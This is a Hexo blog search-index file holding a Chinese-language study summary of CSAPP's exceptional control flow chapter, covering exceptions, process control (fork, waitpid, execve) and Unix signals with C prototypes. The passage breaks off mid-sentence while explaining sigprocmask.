<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CSAPP-ECF知识点总结</title>
      <link href="/2022/02/24/CSAPP-ECF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/"/>
      <url>/2022/02/24/CSAPP-ECF%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h1 id="Exception-异常"><a href="#Exception-异常" class="headerlink" title="Exception(异常)"></a>Exception(异常)</h1><p>定义：异常是为了响应系统事件而使控制流突变到操作系统内核的一个过程。<br>内核是操作系统常驻内核的部分，要注意它不是一个单独的进程，而是经常作为其他进程的一部分运行。</p><h1 id="控制流-Control-flow"><a href="#控制流-Control-flow" class="headerlink" title="控制流(Control flow)"></a>控制流(Control flow)</h1><p>定义：  处理器从加电开始到断电结束，会按顺序地一次执行一个指令，这个指令序列叫做控制流(Control flow)。<br>我们知道一个程序可以使用<em>if-else</em>分支、函数调用等来使控制流发生突变，而系统也需要根据系统状态的变化来使控制流发生突变，这种突变被称为**异常控制流(Exception control flow)**。<br>异常控制流同时存在于操作系统的底层和高层部分：</p><ul><li>底层机制<ul><li>异常(Exception)，根据系统事件改变控制流，同时由硬件和系统软件实现。</li></ul></li><li>高层机制<ul><li>进程的上下文切换，由硬件计时器和操作系统软件组成。</li><li>信号，由操作系统软件实现。</li><li>非本地跳转，由C运行时库实现。</li></ul></li></ul><h1 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h1><p>系统中的每种类型的异常均分配了一个唯一的非负整数的**异常号(exception number)**。在系统启动时，操作系统分配和初始化一张称为异常表的跳转表，其中条目k包含异常k的处理程序地址，如下图所示。</p><p><img src="https://s2.loli.net/2022/02/16/dKRNX3PcI5D1xgy.png" alt="image.png"><br>异常表的起始地址存放在属于CPU特殊寄存器的异常表基址寄存器(exception table base register)中，异常号是到异常表中的索引。<br>异常k的条目的地址=异常表起始地址+异常号*4<br>异常与过程调用的不同之处：</p><ul><li>过程调用时，在跳转到处理程序前，处理器会将返回地址(当前指令的下一条指令)压到栈中。但是，根据异常的类型，返回地址为当前指令或下一条指令中的一种。</li><li>在处理异常时，处理器会将一些额外的处理器状态压入栈中，当处理程序返回并重新执行被中断的程序时，会将当前处理器状态设置为所保存的状态。</li><li>如果处理程序要求从用户态转移到内核态，那么所有的信息都会压入到内存栈中。</li><li>异常处理程序运行在内核态下，对所有的系统资源拥有完全的访问权限。</li></ul><h1 id="异常类型"><a href="#异常类型" class="headerlink" title="异常类型"></a>异常类型</h1><h2 id="异步异常-中断-interrupt"><a href="#异步异常-中断-interrupt" class="headerlink" title="异步异常(中断 interrupt)"></a>异步异常(中断 interrupt)</h2><p>中断由处理器外部的事件造成，因为硬件中断不是由任何一条专门的指令造成的，所以称其为异步。硬件中断的异常处理程序称为中断处理程序。<br>工作过程：I/O设备通过向处理器的中断引脚发送信号，并将异常号发送到系统总线上，来触发中断。当中断处理程序返回时，<strong>总会</strong>将控制转移给正常情况下要执行的下一条指令。</p><h2 id="同步异常"><a href="#同步异常" class="headerlink" title="同步异常"></a>同步异常</h2><p>接下来所要介绍的异常是同步发生的，也就是执行当前指令的结果。这类指令又被称为故障指令(faulting instruction)</p><h3 id="陷阱和系统调用-trap"><a href="#陷阱和系统调用-trap" class="headerlink" title="陷阱和系统调用(trap)"></a>陷阱和系统调用(trap)</h3><p>陷阱是人为有意的异常，其处理程序总是将控制返回到下一条指令。陷阱最重要的作用是在用户程序和内核之间提供一个像过程一样的接口，叫做系统调用。比如，system calls，gdb断点。<br>系统调用是通过处理器提供的一条特殊指令<code>syscall n</code>实现的，它看起来与普通函数调用没什么区别，但是后者运行在用户模式中，前者运行在内核模式中，允许系统调用可以执行特权指令，并且访问定义在内核中的栈。<br>每个x86-64系统调用都有一个唯一的非负整数号。</p><table><thead><tr><th align="center">数字</th><th align="center">名字</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">0</td><td align="center">read</td><td align="center">读取文件</td></tr><tr><td align="center">1</td><td align="center">write</td><td align="center">写文件</td></tr><tr><td align="center">2</td><td align="center">open</td><td align="center">打开文件</td></tr><tr><td align="center">3</td><td align="center">close</td><td align="center">关闭文件</td></tr><tr><td align="center">4</td><td align="center">stat</td><td align="center">获得文件信息</td></tr><tr><td align="center">57</td><td align="center">fork</td><td align="center">创建进程</td></tr></tbody></table><p>在Linux/x86-64系统上，每个系统调用的整数号，对应于一个到内核中跳转表的偏移量。(这个跳转表并不是异常表)</p><h3 id="故障-fault"><a href="#故障-fault" class="headerlink" title="故障(fault)"></a>故障(fault)</h3><p>故障是由错误情况引起的，可能被故障处理程序修正。故障发生时，处理器会将控制权交给故障处理程序。如果故障被成功修复，那么就会将控制权重新交给引起故障的指令，否则，故障处理程序会返回到内核中的abort例程，而abort例程会终止引起故障的应用程序。<br>例子：虚拟内存的缺页异常(可恢复)，一般保护性故障(不可恢复)，浮点异常(不可恢复)。</p><h3 id="终止-abort"><a href="#终止-abort" class="headerlink" title="终止(abort)"></a>终止(abort)</h3><p>终止由不可恢复的致命错误造成，处理程序会将控制转移给abort例程，终止应用程序。</p><h1 id="Process-进程"><a href="#Process-进程" class="headerlink" title="Process(进程)"></a>Process(进程)</h1><p>定义：an instance of a running program.<br>进程是一种对操作系统资源的抽象，用户看起来会感觉每个进程是独占CPU和内存资源的。<br>Linux提供了一个叫做/proc文件系统的机制，它允许用户模式下的进程访问内核数据结构中的内容。比如<code>/proc/cpuinfo</code>可以访问CPU类型，<code>/proc/&lt;process-id&gt;/map</code>可以访问进程使用的内存段。</p><h2 id="逻辑流"><a href="#逻辑流" class="headerlink" title="逻辑流"></a>逻辑流</h2><p>定义：在程序开始到结束这个时间内，PC(程序计数器)中值的序列叫做逻辑控制流，简称逻辑流。<br>并发流(concurrent flow)，：两个进程的逻辑流在执行过程中发生时间上的重叠。多个流并发执行的现象被称为并发。并行流(parallel flow)是并发流的一个真子集，我们把运行在不同处理器或计算机上的并发流称为并行流。</p><h2 id="上下文切换-context-switch"><a href="#上下文切换-context-switch" class="headerlink" title="上下文切换(context switch)"></a>上下文切换(context switch)</h2><p>上下文切换是实现操作系统多任务的基石，内核为每个进程维护一个上下文，其中包含内核重新启动一个被抢占进程所需要的状态。<br>上下文由对象的一些值组成，包含的对象有通用目的寄存器、浮点寄存器、程序计数器、用户栈、状态寄存器、内核栈和各种内核数据结构(页表、进程表和文件表)。<br><img src="https://s2.loli.net/2022/02/17/fpYZhKOvmSQlcjr.png" alt="image.png"></p><h1 id="进程控制-process-control"><a href="#进程控制-process-control" class="headerlink" title="进程控制(process control)"></a>进程控制(process control)</h1><h2 id="获取进程ID"><a href="#获取进程ID" class="headerlink" title="获取进程ID"></a>获取进程ID</h2><p>每个进程都拥有唯一的非负整数ID(PID)。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpid</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 返回当前进程PID</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getppid</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 返回当前父进程的PID</span></span><br></pre></td></tr></table></figure><h2 id="进程的生命周期"><a href="#进程的生命周期" class="headerlink" title="进程的生命周期"></a>进程的生命周期</h2><ul><li>运行。进程要么在CPU上正在执行，要么等待被内核调度执行。</li><li>停止。进程执行时被挂起，直到接收到通知才会被调度。</li><li>终止。进程被永远地停止运行。<ul><li>收到一个信号，该信号的默认行为是终止进程。</li><li>从主程序返回</li><li>调用exit函数</li></ul></li></ul><h3 id="终止进程"><a href="#终止进程" class="headerlink" title="终止进程"></a>终止进程</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exit</span><span class="params">(<span class="keyword">int</span> status)</span></span>; <span class="comment">// 调用一次永不返回</span></span><br></pre></td></tr></table></figure><p>以退出状态<code>status</code>来终止进程，按照以往习惯来说，0代表正常返回，非0代表发生错误。另外一种显示的设置退出状态的方法是在main例程中返回一个整数值。</p><h3 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h3><p>父进程通过调用fork函数，来创建一个新的子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">fork</span><span class="params">(<span class="keyword">void</span>)</span></span>; <span class="comment">// 调用一次返回两次</span></span><br></pre></td></tr></table></figure><p>父子进程的相同和不同点：</p><ul><li>相同点<ul><li>子进程拥有与父进程相同但是单独的用户级虚拟地址空间副本，包括代码和数据堆、栈、共享库以及用户栈</li><li>子进程拥有父进程已打开文件描述符的相同副本(继承父进程打开的所有文件)</li></ul></li><li>不同点<ul><li>两者PID不同</li></ul></li></ul><p><code>fork</code>函数返回两次，对父进程返回子进程的PID，子进程返回0。<br>子进程创建图：<br>![image.png](<a href="https://s2.loli.net/2022/02/17/HfpaULdqEbtnQo5">https://s2.loli.net/2022/02/17/HfpaULdqEbtnQo5</a>.<br>png)</p><h4 id="虚拟内存与内存映射的作用"><a href="#虚拟内存与内存映射的作用" class="headerlink" title="虚拟内存与内存映射的作用"></a>虚拟内存与内存映射的作用</h4><p>虚拟内存和内存映射机制可以为新创建的进程提供私有的内存空间，过程如下：</p><ul><li>创建与父进程相同的mm_struct、vm_area_struct和页表</li><li>将父子进程的页标为只读</li><li>将父子进程的vm_area_struct标为私有的写时复制</li></ul><p>当fork函数过多时，可以使用进程图(一种简单的前趋图)来整理创建的过程，有助于了解并行过程。该图所有顶点的拓扑排序代表程序语句中一个可行的全序排列。</p><div class="note info simple"><p>排列是一个拓扑排序，当且仅当顶点序列从左到右画出的每条有向边方向都是从左向右的。</p></div><h2 id="回收子进程"><a href="#回收子进程" class="headerlink" title="回收子进程"></a>回收子进程</h2><p>当一个进程终止时，内核并不会立即将它从系统中清除，而是保持在一种已终止的状态下(此时还在占用着系统资源)，直到被它的父进程回收(reaped)。<br>回收过程如下：</p><ul><li>父进程执行<code>wait</code>或<code>waitpid</code>命令来回收终止的子进程</li><li>内核将子进程的退出状态传递给父进程</li><li>内核删除僵尸子进程</li></ul><p><strong>特殊情况</strong>：如果父进程在未回收子进程前被终止，那么孤儿进程将被init进程回收。<br>init进程PID为1，是在系统启动时由内核创建的，不会终止，是所有进程的祖先。<br>还有一种情况是父进程终止而子进程没有被终止，这种情况下必须手动kill掉，否则子进程会永远的运行下去。<br>进程可以使用<code>waitpid</code>函数来回收子进程。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">waitpid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> *statusp, <span class="keyword">int</span> options)</span></span></span><br></pre></td></tr></table></figure><p>默认情况下<code>waitpid</code>函数会挂起调用进程直到它等待集合(wait set)中的一个子进程终止，并返回导致函数返回的已终止进程的PID。这时，已终止的子进程就被彻底回收了，内核会删除其在系统中的痕迹。</p><div class="note warning simple"><p>waitpid只能回收儿子进程，而不能回收孙子进程。</p></div><p>wait是waitpid函数的简单版本，调用<code>wait(&amp;status)</code>相当于调用<code>waitpid(-1, &amp;status, 0)</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">wait</span><span class="params">(<span class="keyword">int</span> *statusp)</span></span>;</span><br></pre></td></tr></table></figure><h3 id="判断等待集合的成员"><a href="#判断等待集合的成员" class="headerlink" title="判断等待集合的成员"></a>判断等待集合的成员</h3><p>wait set由参数pid确定。</p><ul><li>pid&gt;0，等待集合为一个单独的子进程，进程ID等于pid。</li><li>pid=-1，等待集合由父进程所有的子进程组成</li><li>也支持其他类型的等待集合，具体的可查看<a href="https://www.ibm.com/docs/en/zos/2.1.0?topic=functions-waitpid-wait-specific-child-process-end">文档</a>。</li></ul><h3 id="修改默认行为"><a href="#修改默认行为" class="headerlink" title="修改默认行为"></a>修改默认行为</h3><p>通过修改<code>options</code>来改变默认的行为</p><ul><li>WNOHANG：如果等待集合中的任何子进程都还没有终止，则立即返回0。默认的行为是挂起调用进程，直到有子进程终止。这个选项可以在等待子进程终止时，做一些其他的工作。在检查是否存在已经死掉的子进程时很有用。</li><li>WUNTRACED：挂起调用进程，直到等待集合中的一个进程变为已终止或<em>被停止</em>状态。这个选项在检查因收到停止信号<code>SIGSTOP</code>而停止的子进程时很有用，可以有效的避免父进程因无限等待而陷入死锁的状态。</li><li>WCONTINUED：挂起调用进程的执行，直到等待集合中一个正在运行的进程终止或等待集合中一个被停止的进程收到<code>SIGCONT</code>信号重新开始执行。</li></ul><p>这些选项可以组合起来使用。比如：<code>WNOHANG | WUNTRACED</code></p><h3 id="检查已回收子进程的退出状态"><a href="#检查已回收子进程的退出状态" class="headerlink" title="检查已回收子进程的退出状态"></a>检查已回收子进程的退出状态</h3><p>如果statusp参数是非空的，那么waitpid就会在status中放上导致子进程返回的状态信息，status是statusp指向的值。</p><ul><li>WIFEXITED(status)：如果子进程通过调用exit或者一个return正常终止，则为真。不管返回的数值为多少</li><li>WEXITSTATUS(status)：返回一个正常终止子进程的退出状态，只有在WIFEXITED()返回为真时，才会定义该状态。</li><li>WIFSIGNALED(status)：如果子进程是因为一个未被捕获的信号终止的，则返回真。</li><li>WTERMSIG(status)：返回导致子进程终止的信号编号，只有WIFSIGNALED(status)返回为真时才会定义该状态。</li><li>WIFSTOPPED(status)：如果引起返回的子进程当前是停止的，则返回真。该检查应该只用在存在<code>WUNTRACED</code>选项的<code>waitpid()</code>函数下。</li><li>WSTOPSIG(status)：返回引起子进程停止的信号编号。只有在WIFSTOPPED(status)返回为真时才会定义这个状态。</li><li>WIFCONTINUED(status)：如果子进程收到SIGCONT信号重新启动则返回真。</li></ul><h3 id="错误条件"><a href="#错误条件" class="headerlink" title="错误条件"></a>错误条件</h3><p>如果调用进程没有子进程，那么waitpid会返回-1，并且设置errno全局变量为ECHILD。如果waitpid函数被一个信号中断，那么它返回-1，并设置errno为EINTR。</p><h2 id="加载并运行程序-execve"><a href="#加载并运行程序-execve" class="headerlink" title="加载并运行程序(execve)"></a>加载并运行程序(execve)</h2><p>execve函数在当前进程的上下文中加载并运行一个新的程序。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">execve</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">const</span> <span class="keyword">char</span> *argv[],</span></span></span><br><span class="line"><span class="params"><span class="function">                 <span class="keyword">const</span> <span class="keyword">char</span> *envp[])</span></span>;</span><br><span class="line"><span class="comment">/* 成功不返回，发生错误则返回-1 */</span></span><br></pre></td></tr></table></figure><p>execve函数在运行时可以带上参数列表<code>argv</code>和环境变量列表<code>envp</code>。<br>agrv和envp的结构如下所示：<br><img src="https://s2.loli.net/2022/02/18/E7SgQuBipNRomXF.png" alt="image.png"><br>argv指向一个以NULL结尾的指针数组，其中的每个指针均指向一个参数字符串。根据规则，argv[0]是可执行目标文件的文件名。envp指向的是一个环境变量的列表，两者结构类似，后者为环境变量字符串，由”name=value”对组成。<br><code>char *getenv(const char *name)</code>根据name搜索环境变量，如果找到了则返回执行value的指针，否则返回NULL。<br><code>int setenv(const char *name, const char *newvalue, int overwrite)</code>在overwrite非零时会用newvalue替换掉oldvalue。如果name不存在那么就会将”name=value”添加到数组中。<br><code>void unsetenv(const char *name)</code>将环境数组中的该环境变量删除，系统中的环境变量还存在。<br>libc_start_main系统启动函数初始化执行环境，调用用户层的main函数，处理main函数的返回值，并且在需要的时候将控制转移给内核。<br>execve执行后的进程结构：<br><img src="https://s2.loli.net/2022/02/18/Hh7AEPiXZUIK45G.png" alt="image.png"><br>.text和.data段是由目标程序初始化的，.bss段是匿名文件。</p><h1 id="Signal-信号"><a href="#Signal-信号" class="headerlink" title="Signal(信号)"></a>Signal(信号)</h1><p>正如之前所说，信号是由软件产生并可以在用户进程被处理的ECF机制。接下来会总结一下发送、接收、阻塞和解除阻塞信号的方法，以及编写信号处理程序时需要注意的点，同步流来避免并发错误。<br>Linux中常用的信号：</p><table><thead><tr><th align="center">名称</th><th align="center">默认行为</th><th align="center">相应事件</th></tr></thead><tbody><tr><td align="center">SIGINT</td><td align="center">终止</td><td align="center">键盘发送的中断信号</td></tr><tr><td align="center">SIGKILL</td><td align="center">终止</td><td align="center">杀死程序</td></tr><tr><td align="center">SIGSEGV</td><td align="center">终止并转储内存</td><td align="center">无效的内存引用（段故障）</td></tr><tr><td align="center">SIGCHLD</td><td align="center">忽略</td><td align="center">一个子进程的终止或停止</td></tr><tr><td align="center">SIGCONT</td><td align="center">忽略</td><td align="center">如果进程停止则继续执行</td></tr><tr><td align="center">SIGSTP</td><td align="center">停止直到下一个SIGCONT</td><td align="center">来自键盘的停止信号（Ctrl-Z）</td></tr></tbody></table><p><em>在Linux系统下按下Ctrl+C后，内核会将SIGINT信号发送给<strong>前台进程组的每个进程</strong></em>。<br>待处理信号(pending signal)：一个发出而没有被接收的信号。在任意时刻，一种类型的信号至多有一个待处理信号。其它多余的信号都会被<strong>丢弃</strong>。<br>当信号被阻塞时，它仍可以被发出，但是产生的待处理信号不会被接收，直到目的进程取消对该信号的阻塞。<br>内核为每个进程在<em>pending</em>位向量中维护着待处理信号集合，在<em>blocked</em>位向量中维护着被阻塞信号的集合。<br>当发送一个类型为k的信号时，内核会设置pending中的第k位，而接收一个类型为k的信号，内核会清除pending中的第k位。这也就导致了待处理信号最多只能被接收一次。</p><h2 id="发送信号"><a href="#发送信号" class="headerlink" title="发送信号"></a>发送信号</h2><p>内核是通过更新目的进程上下文中的某个状态，来实现向目的进程发送信号这一过程的。<br>发送信号的原因有如下两种：</p><ol><li>内核检测到一个系统事件，如子进程终止。</li><li>一个进程调用了<code>kill</code>函数，显示地要求内核发送一个信号给目的进程。一个进程可以向自己发送信号。</li></ol><h3 id="进程组"><a href="#进程组" class="headerlink" title="进程组"></a>进程组</h3><p>进程组这个概念为Unix系统向大量进程发送信号提供了基础。<br>每个进程都<strong>只属于一个进程组</strong>，进程组由一个正整数ID来标识。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 返回调用进程的进程组ID */</span></span><br><span class="line"><span class="function"><span class="keyword">pid_t</span> <span class="title">getpgrp</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br></pre></td></tr></table></figure><p>默认情况下，一个子进程与其父进程同属于一个进程组，孙子进程等也属于该进程组。一个进程可以使用setpgid函数来改变自己或其他进程的进程组。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 成功返回0，错误返回-1*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">setpgid</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">pid_t</span> pgid)</span></span>;</span><br></pre></td></tr></table></figure><p><code>setpgid</code>将进程pid的进程组改为pgid。</p><ul><li>pid为0，则使用当前进程的PID。</li><li>pgid是0，那么就用pid指定的进程的PID作为进程组ID。</li></ul><div class="note warning simple"><p>修改进程组ID后不应该与当前上下文冲突，否则会出现权限不允许错误。</p></div><h3 id="发送信号的几种方式"><a href="#发送信号的几种方式" class="headerlink" title="发送信号的几种方式"></a>发送信号的几种方式</h3><h4 id="bin-kill程序发送信号"><a href="#bin-kill程序发送信号" class="headerlink" title="/bin/kill程序发送信号"></a>/bin/kill程序发送信号</h4><p><code>/bin/kill -9 666</code><br>上述命令会向PID=666的进程发送整数9所代表的信号（SIGKILL）。<br>如果PID为负数，那么将会向进程组PID发送信号。比如-666代表向ID为666的进程组中的每个进程发送信号。<br>使用完整路径的原因是有些Unix shell拥有自己内置的kill命令，会被优先执行。</p><h3 id="从键盘发送信号"><a href="#从键盘发送信号" class="headerlink" title="从键盘发送信号"></a>从键盘发送信号</h3><p>Unix shell用作业（job）这个抽象概念来表示为对一个命令行求值而创建的进程。在任何时刻至多只有一个前台作业和0个或多个后台作业。一个作业中可以包含多个进程。<br>shell会为每个作业创建一个独立的进程组，进程组的ID通常取自父进程中的一个。<br>键盘输入Ctrl+C会导致内核发送一个SIGINT信号到<mark class="hl-label red">前台进程组的每个进程</mark> ，默认终止作业。Ctrl+Z会发送一个SIGSTP信号给前台进程组中的每个进程，默认挂起前台作业。</p><h3 id="kill函数发送信号"><a href="#kill函数发送信号" class="headerlink" title="kill函数发送信号"></a>kill函数发送信号</h3><p>进程通过调用kill函数发送信号给其他进程（包括自己）。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 成功返回0 错误返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kill</span><span class="params">(<span class="keyword">pid_t</span> pid, <span class="keyword">int</span> sig)</span></span>;</span><br></pre></td></tr></table></figure><p>几种选择：</p><ul><li>pid大于0，发送信号sig给进程pid。</li><li>pid等于0，发送信号sig给调用进程所在进程组中的每个进程，包括自己。</li><li>pid小于0，发送信号sig给进程组|pid|中的每个进程。</li></ul><h3 id="alarm函数发送信号"><a href="#alarm函数发送信号" class="headerlink" title="alarm函数发送信号"></a>alarm函数发送信号</h3><p>进程可以通过调用alarm函数向自己发送SIGALRM信号。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">alarm</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> secs)</span></span>;</span><br><span class="line"><span class="comment">/* 默认终止调用进程 */</span></span><br></pre></td></tr></table></figure><p>调用该函数后会安排内核在secs秒后发送一个SIGALRM信号给调用进程。如果为0则不会调度安排新的alarm。在任何情况下，对alarm的调用都将取消待处理的闹钟，并返回任何待处理闹钟在被发送前还剩下的秒数(secs参数不为0)；如果没有任何待处理的闹钟，则返回零。</p><h2 id="接收信号"><a href="#接收信号" class="headerlink" title="接收信号"></a>接收信号</h2><p>当内核将进程p从内核模式切换到用户模式时，它会检查进程p的未被阻塞待处理信号的集合(pending &amp; ~blocked)。如果集合为空则会将控制转递到进程p逻辑控制流中的下一条指令，否则内核会选择集合中的某个信号k(通常是最小的k)，并且强制进程p接收信号k，收到信号后会触发进程采取某种行为。每个信号类型都有一个预定义的默认行为，有下面几种：</p><ul><li>进程终止</li><li>进程终止并转储内存</li><li>进程挂起直到被SIGCONT信号重启</li><li>进程忽略该信号</li></ul><p>进程可以通过调用signal函数来修改和信号相关联的默认行为，除了SIGSTOP和SIGKILL信号的默认行为是不可修改的。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*<span class="keyword">sighandler_t</span>)</span><span class="params">(<span class="keyword">int</span>)</span></span></span><br><span class="line"><span class="function"><span class="comment">/* 成功则返回指向前一次处理程序的指针，出错则返回SIG_ERR(不设置errno)*/</span></span></span><br><span class="line"><span class="function"><span class="keyword">sighandler_t</span> <span class="title">signal</span><span class="params">(<span class="keyword">int</span> signum, <span class="keyword">sighandler_t</span> handler)</span></span>;</span><br></pre></td></tr></table></figure><p>signal可以通过下列三种方法之一来改变和信号signum相关联的行为：</p><ul><li>handler是SIG_IGN，则忽略类型为signum的信号。</li><li>handler是SIG_DFL，那么类型为signum的信号恢复默认行为。</li><li>handler可以是用户定义的函数地址，该函数被称为信号处理程序。当进程捕获一个信号k时，会将处理程序的整数参数设置为k，这样可以使同一个处理程序捕获不同类型的信号。</li></ul><blockquote><p>SIG_IGN和SIG_DFL均为预定义函数</p></blockquote><p>当一个处理程序执行return语句时，控制（通常）传递回控制流中被信号接收中断的位置处。在某些系统中，被中断的系统调用会立即返回一个错误。</p><h2 id="阻塞和解除阻塞信号"><a href="#阻塞和解除阻塞信号" class="headerlink" title="阻塞和解除阻塞信号"></a>阻塞和解除阻塞信号</h2><ul><li>显示阻塞机制。应用程序可以使用<code>sigprocmask</code>及其辅助函数，明确地阻塞和解除阻塞选定的信号。</li><li>隐式阻塞机制。内核默认阻塞任何当前处理程序正在处理信号类型的待处理信号。比如，处理程序正在处理信号s，那么在处理程序返回前，如果再向该进程发送一个信号s，s会变成待处理信号而不会接收。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="comment">/* 改变当前阻塞的信号集合，具体行为依赖how值 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigprocmask</span><span class="params">(<span class="keyword">int</span> how, <span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">sigset_t</span> *oldset)</span></span>;</span><br><span class="line"><span class="comment">/* 初始化set为空集合 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigemptyset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="comment">/* 将每个信号都添加到set中 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigfillset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>)</span></span>;</span><br><span class="line"><span class="comment">/* 将signum添加到set中 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigaddset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">/* 从set中删除signum 成功返回0 失败返回-1 */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigdelset</span><span class="params">(<span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br><span class="line"><span class="comment">/* 如果signum是set中的成员则返回1 不是则返回0 出错返回-1*/</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sigismember</span><span class="params">(<span class="keyword">const</span> <span class="keyword">sigset_t</span> *<span class="built_in">set</span>, <span class="keyword">int</span> signum)</span></span>;</span><br></pre></td></tr></table></figure>how参数的取值：</li><li>SIG_BLOCK：将set中的信号添加到blocked中(blocked=blocked | set)</li><li>SIG_UNBLOCK：从blocked中删除set的信号(blocked = blocked &amp; 